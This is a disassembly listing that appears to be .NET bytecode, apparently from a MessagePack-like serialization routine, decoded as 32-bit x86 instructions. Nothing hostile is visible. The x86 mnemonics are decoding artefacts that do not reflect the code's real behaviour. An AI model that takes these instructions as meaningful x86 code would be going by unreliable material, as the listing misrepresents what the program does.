  4051cc:	00 18                	add    %bl,(%eax)
  4051ce:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051d2:	01 0b                	add    %ecx,(%ebx)
  4051d4:	03 07                	add    (%edi),%eax
  4051d6:	16                   	push   %ss
  4051d7:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051da:	00 00                	add    %al,(%eax)
  4051dc:	0a 26                	or     (%esi),%ah
  4051de:	07                   	pop    %es
  4051df:	28 58 00             	sub    %bl,0x0(%eax)
  4051e2:	00 06                	add    %al,(%esi)
  4051e4:	0b 07                	or     (%edi),%eax
  4051e6:	16                   	push   %ss
  4051e7:	28 07                	sub    %al,(%edi)
  4051e9:	01 00                	add    %eax,(%eax)
  4051eb:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051ee:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051f1:	00 06                	add    %al,(%esi)
  4051f3:	02 18                	add    (%eax),%bl
  4051f5:	7d 36                	jge    0x40522d
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	04 16                	add    $0x16,%al
  4051fb:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405200:	00 02                	add    %al,(%edx)
  405202:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405206:	06                   	push   %es
  405207:	25 03 28 96 00       	and    $0x962803,%eax
  40520c:	00 06                	add    %al,(%esi)
  40520e:	6f                   	outsl  %ds:(%esi),(%dx)
  40520f:	6a 00                	push   $0x0
  405211:	00 06                	add    %al,(%esi)
  405213:	03 6f 88             	add    -0x78(%edi),%ebp
  405216:	00 00                	add    %al,(%eax)
  405218:	06                   	push   %es
  405219:	09 17                	or     %edx,(%edi)
  40521b:	58                   	pop    %eax
  40521c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405221:	2a 06                	sub    (%esi),%al
  405223:	20 df                	and    %bl,%bh
  405225:	00 00                	add    %al,(%eax)
  405227:	00 40 55             	add    %al,0x55(%eax)
  40522a:	00 00                	add    %al,(%eax)
  40522c:	00 1a                	add    %bl,(%edx)
  40522e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405232:	01 0b                	add    %ecx,(%ebx)
  405234:	03 07                	add    (%edi),%eax
  405236:	16                   	push   %ss
  405237:	1a 6f 45             	sbb    0x45(%edi),%ch
  40523a:	00 00                	add    %al,(%eax)
  40523c:	0a 26                	or     (%esi),%ah
  40523e:	07                   	pop    %es
  40523f:	28 58 00             	sub    %bl,0x0(%eax)
  405242:	00 06                	add    %al,(%esi)
  405244:	0b 07                	or     (%edi),%eax
  405246:	16                   	push   %ss
  405247:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40524b:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40524e:	28 6b 00             	sub    %ch,0x0(%ebx)
  405251:	00 06                	add    %al,(%esi)
  405253:	02 18                	add    (%eax),%bl
  405255:	7d 36                	jge    0x40528d
  405257:	00 00                	add    %al,(%eax)
  405259:	04 16                	add    $0x16,%al
  40525b:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405260:	00 02                	add    %al,(%edx)
  405262:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405266:	06                   	push   %es
  405267:	25 03 28 96 00       	and    $0x962803,%eax
  40526c:	00 06                	add    %al,(%esi)
  40526e:	6f                   	outsl  %ds:(%esi),(%dx)
  40526f:	6a 00                	push   $0x0
  405271:	00 06                	add    %al,(%esi)
  405273:	03 6f 88             	add    -0x78(%edi),%ebp
  405276:	00 00                	add    %al,(%eax)
  405278:	06                   	push   %es
  405279:	09 17                	or     %edx,(%edi)
  40527b:	58                   	pop    %eax
  40527c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405281:	2a 06                	sub    (%esi),%al
  405283:	20 da                	and    %bl,%dl
  405285:	00 00                	add    %al,(%eax)
  405287:	00 40 0e             	add    %al,0xe(%eax)
  40528a:	00 00                	add    %al,(%eax)
  40528c:	00 02                	add    %al,(%edx)
  40528e:	06                   	push   %es
  40528f:	03 28                	add    (%eax),%ebp
  405291:	97                   	xchg   %eax,%edi
  405292:	00 00                	add    %al,(%eax)
  405294:	06                   	push   %es
  405295:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40529b:	06                   	push   %es
  40529c:	20 db                	and    %bl,%bl
  40529e:	00 00                	add    %al,(%eax)
  4052a0:	00 40 0e             	add    %al,0xe(%eax)
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	00 02                	add    %al,(%edx)
  4052a7:	06                   	push   %es
  4052a8:	03 28                	add    (%eax),%ebp
  4052aa:	97                   	xchg   %eax,%edi
  4052ab:	00 00                	add    %al,(%eax)
  4052ad:	06                   	push   %es
  4052ae:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052b4:	06                   	push   %es
  4052b5:	20 d0                	and    %dl,%al
  4052b7:	00 00                	add    %al,(%eax)
  4052b9:	00 40 0f             	add    %al,0xf(%eax)
  4052bc:	00 00                	add    %al,(%eax)
  4052be:	00 02                	add    %al,(%edx)
  4052c0:	03 6f 00             	add    0x0(%edi),%ebp
  4052c3:	01 00                	add    %eax,(%eax)
  4052c5:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c8:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052cc:	06                   	push   %es
  4052cd:	2a 06                	sub    (%esi),%al
  4052cf:	20 d1                	and    %dl,%cl
  4052d1:	00 00                	add    %al,(%eax)
  4052d3:	00 40 27             	add    %al,0x27(%eax)
  4052d6:	00 00                	add    %al,(%eax)
  4052d8:	00 18                	add    %bl,(%eax)
  4052da:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052de:	01 0b                	add    %ecx,(%ebx)
  4052e0:	03 07                	add    (%edi),%eax
  4052e2:	16                   	push   %ss
  4052e3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052e6:	00 00                	add    %al,(%eax)
  4052e8:	0a 26                	or     (%esi),%ah
  4052ea:	07                   	pop    %es
  4052eb:	28 58 00             	sub    %bl,0x0(%eax)
  4052ee:	00 06                	add    %al,(%esi)
  4052f0:	0b 02                	or     (%edx),%eax
  4052f2:	07                   	pop    %es
  4052f3:	16                   	push   %ss
  4052f4:	28 07                	sub    %al,(%edi)
  4052f6:	01 00                	add    %eax,(%eax)
  4052f8:	0a 6a 28             	or     0x28(%edx),%ch
  4052fb:	74 00                	je     0x4052fd
  4052fd:	00 06                	add    %al,(%esi)
  4052ff:	2a 06                	sub    (%esi),%al
  405301:	20 d2                	and    %dl,%dl
  405303:	00 00                	add    %al,(%eax)
  405305:	00 40 27             	add    %al,0x27(%eax)
  405308:	00 00                	add    %al,(%eax)
  40530a:	00 1a                	add    %bl,(%edx)
  40530c:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405310:	01 0b                	add    %ecx,(%ebx)
  405312:	03 07                	add    (%edi),%eax
  405314:	16                   	push   %ss
  405315:	1a 6f 45             	sbb    0x45(%edi),%ch
  405318:	00 00                	add    %al,(%eax)
  40531a:	0a 26                	or     (%esi),%ah
  40531c:	07                   	pop    %es
  40531d:	28 58 00             	sub    %bl,0x0(%eax)
  405320:	00 06                	add    %al,(%esi)
  405322:	0b 02                	or     (%edx),%eax
  405324:	07                   	pop    %es
  405325:	16                   	push   %ss
  405326:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40532a:	0a 6a 28             	or     0x28(%edx),%ch
  40532d:	74 00                	je     0x40532f
  40532f:	00 06                	add    %al,(%esi)
  405331:	2a 06                	sub    (%esi),%al
  405333:	20 d3                	and    %dl,%bl
  405335:	00 00                	add    %al,(%eax)
  405337:	00 40 25             	add    %al,0x25(%eax)
  40533a:	00 00                	add    %al,(%eax)
  40533c:	00 1e                	add    %bl,(%esi)
  40533e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405342:	01 0b                	add    %ecx,(%ebx)
  405344:	03 07                	add    (%edi),%eax
  405346:	16                   	push   %ss
  405347:	1e                   	push   %ds
  405348:	6f                   	outsl  %ds:(%esi),(%dx)
  405349:	45                   	inc    %ebp
  40534a:	00 00                	add    %al,(%eax)
  40534c:	0a 26                	or     (%esi),%ah
  40534e:	07                   	pop    %es
  40534f:	28 58 00             	sub    %bl,0x0(%eax)
  405352:	00 06                	add    %al,(%esi)
  405354:	0b 02                	or     (%edx),%eax
  405356:	07                   	pop    %es
  405357:	16                   	push   %ss
  405358:	28 08                	sub    %cl,(%eax)
  40535a:	01 00                	add    %eax,(%eax)
  40535c:	0a 28                	or     (%eax),%ch
  40535e:	74 00                	je     0x405360
  405360:	00 06                	add    %al,(%esi)
  405362:	2a 00                	sub    (%eax),%al
  405364:	1b 30                	sbb    (%eax),%esi
  405366:	04 00                	add    $0x0,%al
  405368:	4d                   	dec    %ebp
  405369:	00 00                	add    %al,(%eax)
  40536b:	00 27                	add    %ah,(%edi)
  40536d:	00 00                	add    %al,(%eax)
  40536f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405372:	00 00                	add    %al,(%eax)
  405374:	0a 0a                	or     (%edx),%cl
  405376:	02 06                	add    (%esi),%al
  405378:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  40537e:	6f                   	outsl  %ds:(%esi),(%dx)
  40537f:	e2 00                	loop   0x405381
  405381:	00 0a                	add    %cl,(%edx)
  405383:	d4 8d                	aam    $0x8d
  405385:	44                   	inc    %esp
  405386:	00 00                	add    %al,(%eax)
  405388:	01 0b                	add    %ecx,(%ebx)
  40538a:	06                   	push   %es
  40538b:	16                   	push   %ss
  40538c:	6a 6f                	push   $0x6f
  40538e:	4e                   	dec    %esi
  40538f:	00 00                	add    %al,(%eax)
  405391:	0a 06                	or     (%esi),%al
  405393:	07                   	pop    %es
  405394:	16                   	push   %ss
  405395:	06                   	push   %es
  405396:	6f                   	outsl  %ds:(%esi),(%dx)
  405397:	e2 00                	loop   0x405399
  405399:	00 0a                	add    %cl,(%edx)
  40539b:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  4053a2:	07                   	pop    %es
  4053a3:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a9:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053af:	39 06                	cmp    %eax,(%esi)
  4053b1:	00 00                	add    %al,(%eax)
  4053b3:	00 06                	add    %al,(%esi)
  4053b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4053b6:	33 00                	xor    (%eax),%eax
  4053b8:	00 0a                	add    %cl,(%edx)
  4053ba:	dc 08                	fmull  (%eax)
  4053bc:	2a 00                	sub    (%eax),%al
  4053be:	00 00                	add    %al,(%eax)
  4053c0:	01 10                	add    %edx,(%eax)
  4053c2:	00 00                	add    %al,(%eax)
  4053c4:	02 00                	add    (%eax),%al
  4053c6:	06                   	push   %es
  4053c7:	00 38                	add    %bh,(%eax)
  4053c9:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053d0:	13 30                	adc    (%eax),%esi
  4053d2:	02 00                	add    (%eax),%al
  4053d4:	ec                   	in     (%dx),%al
  4053d5:	00 00                	add    %al,(%eax)
  4053d7:	00 20                	add    %ah,(%eax)
  4053d9:	00 00                	add    %al,(%eax)
  4053db:	11 02                	adc    %eax,(%edx)
  4053dd:	7b 36                	jnp    0x405415
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	04 0a                	add    $0xa,%al
  4053e3:	06                   	push   %es
  4053e4:	45                   	inc    %ebp
  4053e5:	0c 00                	or     $0x0,%al
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	05 00 00 00 05       	add    $0x5000000,%eax
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053fb:	00 00                	add    %al,(%eax)
  4053fd:	1e                   	push   %ds
  4053fe:	00 00                	add    %al,(%eax)
  405400:	00 30                	add    %dh,(%eax)
  405402:	00 00                	add    %al,(%eax)
  405404:	00 42 00             	add    %al,0x0(%edx)
  405407:	00 00                	add    %al,(%eax)
  405409:	54                   	push   %esp
  40540a:	00 00                	add    %al,(%eax)
  40540c:	00 66 00             	add    %ah,0x0(%esi)
  40540f:	00 00                	add    %al,(%eax)
  405411:	79 00                	jns    0x405413
  405413:	00 00                	add    %al,(%eax)
  405415:	86 00                	xchg   %al,(%eax)
  405417:	00 00                	add    %al,(%eax)
  405419:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  40541f:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  405425:	03 02                	add    (%edx),%eax
  405427:	7b 35                	jnp    0x40545e
  405429:	00 00                	add    %al,(%eax)
  40542b:	04 74                	add    $0x74,%al
  40542d:	38 00                	cmp    %al,(%eax)
  40542f:	00 01                	add    %al,(%ecx)
  405431:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  405437:	03 02                	add    (%edx),%eax
  405439:	7b 35                	jnp    0x405470
  40543b:	00 00                	add    %al,(%eax)
  40543d:	04 a5                	add    $0xa5,%al
  40543f:	68 00 00 01 28       	push   $0x28010000
  405444:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405449:	03 02                	add    (%edx),%eax
  40544b:	7b 35                	jnp    0x405482
  40544d:	00 00                	add    %al,(%eax)
  40544f:	04 a5                	add    $0xa5,%al
  405451:	95                   	xchg   %eax,%ebp
  405452:	00 00                	add    %al,(%eax)
  405454:	01 28                	add    %ebp,(%eax)
  405456:	9f                   	lahf
  405457:	00 00                	add    %al,(%eax)
  405459:	06                   	push   %es
  40545a:	2a 03                	sub    (%ebx),%al
  40545c:	02 7b 35             	add    0x35(%ebx),%bh
  40545f:	00 00                	add    %al,(%eax)
  405461:	04 a5                	add    $0xa5,%al
  405463:	6c                   	insb   (%dx),%es:(%edi)
  405464:	00 00                	add    %al,(%eax)
  405466:	01 28                	add    %ebp,(%eax)
  405468:	9e                   	sahf
  405469:	00 00                	add    %al,(%eax)
  40546b:	06                   	push   %es
  40546c:	2a 03                	sub    (%ebx),%al
  40546e:	02 7b 35             	add    0x35(%ebx),%bh
  405471:	00 00                	add    %al,(%eax)
  405473:	04 a5                	add    $0xa5,%al
  405475:	96                   	xchg   %eax,%esi
  405476:	00 00                	add    %al,(%eax)
  405478:	01 28                	add    %ebp,(%eax)
  40547a:	9c                   	pushf
  40547b:	00 00                	add    %al,(%eax)
  40547d:	06                   	push   %es
  40547e:	2a 03                	sub    (%ebx),%al
  405480:	02 7b 35             	add    0x35(%ebx),%bh
  405483:	00 00                	add    %al,(%eax)
  405485:	04 a5                	add    $0xa5,%al
  405487:	97                   	xchg   %eax,%edi
  405488:	00 00                	add    %al,(%eax)
  40548a:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  40548e:	00 00                	add    %al,(%eax)
  405490:	06                   	push   %es
  405491:	2a 03                	sub    (%ebx),%al
  405493:	02 28                	add    (%eax),%ch
  405495:	77 00                	ja     0x405497
  405497:	00 06                	add    %al,(%esi)
  405499:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  40549f:	03 02                	add    (%edx),%eax
  4054a1:	7b 35                	jnp    0x4054d8
  4054a3:	00 00                	add    %al,(%eax)
  4054a5:	04 74                	add    $0x74,%al
  4054a7:	02 00                	add    (%eax),%al
  4054a9:	00 1b                	add    %bl,(%ebx)
  4054ab:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054b1:	02 03                	add    (%ebx),%al
  4054b3:	28 72 00             	sub    %dh,0x0(%edx)
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 02                	sub    (%edx),%al
  4054ba:	03 28                	add    (%eax),%ebp
  4054bc:	73 00                	jae    0x4054be
  4054be:	00 06                	add    %al,(%esi)
  4054c0:	2a 03                	sub    (%ebx),%al
  4054c2:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c8:	1b 30                	sbb    (%eax),%esi
  4054ca:	03 00                	add    (%eax),%eax
  4054cc:	42                   	inc    %edx
  4054cd:	00 00                	add    %al,(%eax)
  4054cf:	00 28                	add    %ch,(%eax)
  4054d1:	00 00                	add    %al,(%eax)
  4054d3:	11 02                	adc    %eax,(%edx)
  4054d5:	0a 16                	or     (%esi),%dl
  4054d7:	0b 06                	or     (%esi),%eax
  4054d9:	12 01                	adc    (%ecx),%al
  4054db:	28 49 00             	sub    %cl,0x0(%ecx)
  4054de:	00 0a                	add    %cl,(%edx)
  4054e0:	02 7b 39             	add    0x39(%ebx),%bh
  4054e3:	00 00                	add    %al,(%eax)
  4054e5:	04 3a                	add    $0x3a,%al
  4054e7:	12 00                	adc    (%eax),%al
  4054e9:	00 00                	add    %al,(%eax)
  4054eb:	02 02                	add    (%edx),%al
  4054ed:	02 7b 38             	add    0x38(%ebx),%bh
  4054f0:	00 00                	add    %al,(%eax)
  4054f2:	04 73                	add    $0x73,%al
  4054f4:	63 00                	arpl   %eax,(%eax)
  4054f6:	00 06                	add    %al,(%esi)
  4054f8:	7d 39                	jge    0x405533
  4054fa:	00 00                	add    %al,(%eax)
  4054fc:	04 dd                	add    $0xdd,%al
  4054fe:	0d 00 00 00 07       	or     $0x7000000,%eax
  405503:	39 06                	cmp    %eax,(%esi)
  405505:	00 00                	add    %al,(%eax)
  405507:	00 06                	add    %al,(%esi)
  405509:	28 50 00             	sub    %dl,0x0(%eax)
  40550c:	00 0a                	add    %cl,(%edx)
  40550e:	dc 02                	faddl  (%edx)
  405510:	7b 39                	jnp    0x40554b
  405512:	00 00                	add    %al,(%eax)
  405514:	04 2a                	add    $0x2a,%al
  405516:	00 00                	add    %al,(%eax)
  405518:	01 10                	add    %edx,(%eax)
  40551a:	00 00                	add    %al,(%eax)
  40551c:	02 00                	add    (%eax),%al
  40551e:	04 00                	add    $0x0,%al
  405520:	2a 2e                	sub    (%esi),%ch
  405522:	00 0d 00 00 00 00    	add    %cl,0x0
  405528:	13 30                	adc    (%eax),%esi
  40552a:	04 00                	add    $0x0,%al
  40552c:	18 00                	sbb    %al,(%eax)
  40552e:	00 00                	add    %al,(%eax)
  405530:	29 00                	sub    %eax,(%eax)
  405532:	00 11                	add    %dl,(%ecx)
  405534:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  40553a:	0a 02                	or     (%edx),%al
  40553c:	06                   	push   %es
  40553d:	16                   	push   %ss
  40553e:	03 6f 45             	add    0x45(%edi),%ebp
  405541:	00 00                	add    %al,(%eax)
  405543:	0a 26                	or     (%esi),%ah
  405545:	06                   	push   %es
  405546:	28 55 00             	sub    %dl,0x0(%ebp)
  405549:	00 06                	add    %al,(%esi)
  40554b:	2a 13                	sub    (%ebx),%dl
  40554d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405550:	b1 00                	mov    $0x0,%cl
  405552:	00 00                	add    %al,(%eax)
  405554:	2a 00                	sub    (%eax),%al
  405556:	00 11                	add    %dl,(%ecx)
  405558:	14 0a                	adc    $0xa,%al
  40555a:	16                   	push   %ss
  40555b:	0b 02                	or     (%edx),%eax
  40555d:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  405563:	18 00                	sbb    %al,(%eax)
  405565:	00 00                	add    %al,(%eax)
  405567:	02 20                	add    (%eax),%ah
  405569:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  40556e:	0d 00 00 00 02       	or     $0x2000000,%eax
  405573:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405579:	0b 38                	or     (%eax),%edi
  40557b:	72 00                	jb     0x40557d
  40557d:	00 00                	add    %al,(%eax)
  40557f:	02 20                	add    (%eax),%ah
  405581:	d9 00                	flds   (%eax)
  405583:	00 00                	add    %al,(%eax)
  405585:	40                   	inc    %eax
  405586:	0c 00                	or     $0x0,%al
  405588:	00 00                	add    %al,(%eax)
  40558a:	03 6f 00             	add    0x0(%edi),%ebp
  40558d:	01 00                	add    %eax,(%eax)
  40558f:	0a 0b                	or     (%ebx),%cl
  405591:	38 5b 00             	cmp    %bl,0x0(%ebx)
  405594:	00 00                	add    %al,(%eax)
  405596:	02 20                	add    (%eax),%ah
  405598:	da 00                	fiaddl (%eax)
  40559a:	00 00                	add    %al,(%eax)
  40559c:	40                   	inc    %eax
  40559d:	25 00 00 00 18       	and    $0x18000000,%eax
  4055a2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055a6:	01 0a                	add    %ecx,(%edx)
  4055a8:	03 06                	add    (%esi),%eax
  4055aa:	16                   	push   %ss
  4055ab:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055ae:	00 00                	add    %al,(%eax)
  4055b0:	0a 26                	or     (%esi),%ah
  4055b2:	06                   	push   %es
  4055b3:	28 58 00             	sub    %bl,0x0(%eax)
  4055b6:	00 06                	add    %al,(%esi)
  4055b8:	0a 06                	or     (%esi),%al
  4055ba:	16                   	push   %ss
  4055bb:	28 02                	sub    %al,(%edx)
  4055bd:	01 00                	add    %eax,(%eax)
  4055bf:	0a 0b                	or     (%ebx),%cl
  4055c1:	38 2b                	cmp    %ch,(%ebx)
  4055c3:	00 00                	add    %al,(%eax)
  4055c5:	00 02                	add    %al,(%edx)
  4055c7:	20 db                	and    %bl,%bl
  4055c9:	00 00                	add    %al,(%eax)
  4055cb:	00 40 20             	add    %al,0x20(%eax)
  4055ce:	00 00                	add    %al,(%eax)
  4055d0:	00 1a                	add    %bl,(%edx)
  4055d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055d6:	01 0a                	add    %ecx,(%edx)
  4055d8:	03 06                	add    (%esi),%eax
  4055da:	16                   	push   %ss
  4055db:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	0a 26                	or     (%esi),%ah
  4055e2:	06                   	push   %es
  4055e3:	28 58 00             	sub    %bl,0x0(%eax)
  4055e6:	00 06                	add    %al,(%esi)
  4055e8:	0a 06                	or     (%esi),%al
  4055ea:	16                   	push   %ss
  4055eb:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055ef:	0a 0b                	or     (%ebx),%cl
  4055f1:	07                   	pop    %es
  4055f2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055f6:	01 0a                	add    %ecx,(%edx)
  4055f8:	03 06                	add    (%esi),%eax
  4055fa:	16                   	push   %ss
  4055fb:	07                   	pop    %es
  4055fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4055fd:	45                   	inc    %ebp
  4055fe:	00 00                	add    %al,(%eax)
  405600:	0a 26                	or     (%esi),%ah
  405602:	06                   	push   %es
  405603:	28 55 00             	sub    %dl,0x0(%ebp)
  405606:	00 06                	add    %al,(%esi)
  405608:	2a 00                	sub    (%eax),%al
  40560a:	00 00                	add    %al,(%eax)
  40560c:	13 30                	adc    (%eax),%esi
  40560e:	04 00                	add    $0x0,%al
  405610:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  405615:	00 00                	add    %al,(%eax)
  405617:	11 03                	adc    %eax,(%ebx)
  405619:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  40561d:	06                   	push   %es
  40561e:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405621:	06                   	push   %es
  405622:	8e 69 0c             	mov    0xc(%ecx),%gs
  405625:	16                   	push   %ss
  405626:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  40562b:	16                   	push   %ss
  40562c:	00 00                	add    %al,(%eax)
  40562e:	00 20                	add    %ah,(%eax)
  405630:	a0 00 00 00 08       	mov    0x8000000,%al
  405635:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405638:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  40563d:	00 00                	add    %al,(%eax)
  40563f:	0a 38                	or     (%eax),%bh
  405641:	80 00 00             	addb   $0x0,(%eax)
  405644:	00 08                	add    %cl,(%eax)
  405646:	20 ff                	and    %bh,%bh
  405648:	00 00                	add    %al,(%eax)
  40564a:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405650:	20 d9                	and    %bl,%cl
  405652:	00 00                	add    %al,(%eax)
  405654:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  40565a:	00 00                	add    %al,(%eax)
  40565c:	0a 08                	or     (%eax),%cl
  40565e:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  405664:	00 00                	add    %al,(%eax)
  405666:	0a 38                	or     (%eax),%bh
  405668:	59                   	pop    %ecx
  405669:	00 00                	add    %al,(%eax)
  40566b:	00 08                	add    %cl,(%eax)
  40566d:	20 ff                	and    %bh,%bh
  40566f:	ff 00                	incl   (%eax)
  405671:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405677:	20 da                	and    %bl,%dl
  405679:	00 00                	add    %al,(%eax)
  40567b:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405681:	00 00                	add    %al,(%eax)
  405683:	0a 08                	or     (%eax),%cl
  405685:	68 28 ef 00 00       	push   $0xef28
  40568a:	0a 28                	or     (%eax),%ch
  40568c:	58                   	pop    %eax
  40568d:	00 00                	add    %al,(%eax)
  40568f:	06                   	push   %es
  405690:	0b 02                	or     (%edx),%eax
  405692:	07                   	pop    %es
  405693:	16                   	push   %ss
  405694:	07                   	pop    %es
  405695:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405698:	4c                   	dec    %esp
  405699:	00 00                	add    %al,(%eax)
  40569b:	0a 38                	or     (%eax),%bh
  40569d:	24 00                	and    $0x0,%al
  40569f:	00 00                	add    %al,(%eax)
  4056a1:	20 db                	and    %bl,%bl
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056ab:	00 00                	add    %al,(%eax)
  4056ad:	0a 08                	or     (%eax),%cl
  4056af:	28 4a 00             	sub    %cl,0x0(%edx)
  4056b2:	00 0a                	add    %cl,(%edx)
  4056b4:	28 58 00             	sub    %bl,0x0(%eax)
  4056b7:	00 06                	add    %al,(%esi)
  4056b9:	0b 02                	or     (%edx),%eax
  4056bb:	07                   	pop    %es
  4056bc:	16                   	push   %ss
  4056bd:	07                   	pop    %es
  4056be:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c1:	4c                   	dec    %esp
  4056c2:	00 00                	add    %al,(%eax)
  4056c4:	0a 02                	or     (%edx),%al
  4056c6:	06                   	push   %es
  4056c7:	16                   	push   %ss
  4056c8:	06                   	push   %es
  4056c9:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056cc:	4c                   	dec    %esp
  4056cd:	00 00                	add    %al,(%eax)
  4056cf:	0a 2a                	or     (%edx),%ch
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 13                	add    %dl,(%ebx)
  4056d5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d8:	94                   	xchg   %eax,%esp
  4056d9:	00 00                	add    %al,(%eax)
  4056db:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056de:	00 11                	add    %dl,(%ecx)
  4056e0:	14 0a                	adc    $0xa,%al
  4056e2:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e8:	07                   	pop    %es
  4056e9:	20 ff                	and    %bh,%bh
  4056eb:	00 00                	add    %al,(%eax)
  4056ed:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056f3:	20 c4                	and    %al,%ah
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056fa:	08 6f ee             	or     %ch,-0x12(%edi)
  4056fd:	00 00                	add    %al,(%eax)
  4056ff:	0a 07                	or     (%edi),%al
  405701:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  405704:	08 6f ee             	or     %ch,-0x12(%edi)
  405707:	00 00                	add    %al,(%eax)
  405709:	0a 38                	or     (%eax),%bh
  40570b:	59                   	pop    %ecx
  40570c:	00 00                	add    %al,(%eax)
  40570e:	00 07                	add    %al,(%edi)
  405710:	20 ff                	and    %bh,%bh
  405712:	ff 00                	incl   (%eax)
  405714:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40571a:	20 c5                	and    %al,%ch
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405721:	08 6f ee             	or     %ch,-0x12(%edi)
  405724:	00 00                	add    %al,(%eax)
  405726:	0a 07                	or     (%edi),%al
  405728:	68 28 ef 00 00       	push   $0xef28
  40572d:	0a 28                	or     (%eax),%ch
  40572f:	58                   	pop    %eax
  405730:	00 00                	add    %al,(%eax)
  405732:	06                   	push   %es
  405733:	0a 02                	or     (%edx),%al
  405735:	06                   	push   %es
  405736:	16                   	push   %ss
  405737:	06                   	push   %es
  405738:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40573b:	4c                   	dec    %esp
  40573c:	00 00                	add    %al,(%eax)
  40573e:	0a 38                	or     (%eax),%bh
  405740:	24 00                	and    $0x0,%al
  405742:	00 00                	add    %al,(%eax)
  405744:	20 c6                	and    %al,%dh
  405746:	00 00                	add    %al,(%eax)
  405748:	00 0c 02             	add    %cl,(%edx,%eax,1)
  40574b:	08 6f ee             	or     %ch,-0x12(%edi)
  40574e:	00 00                	add    %al,(%eax)
  405750:	0a 07                	or     (%edi),%al
  405752:	28 4a 00             	sub    %cl,0x0(%edx)
  405755:	00 0a                	add    %cl,(%edx)
  405757:	28 58 00             	sub    %bl,0x0(%eax)
  40575a:	00 06                	add    %al,(%esi)
  40575c:	0a 02                	or     (%edx),%al
  40575e:	06                   	push   %es
  40575f:	16                   	push   %ss
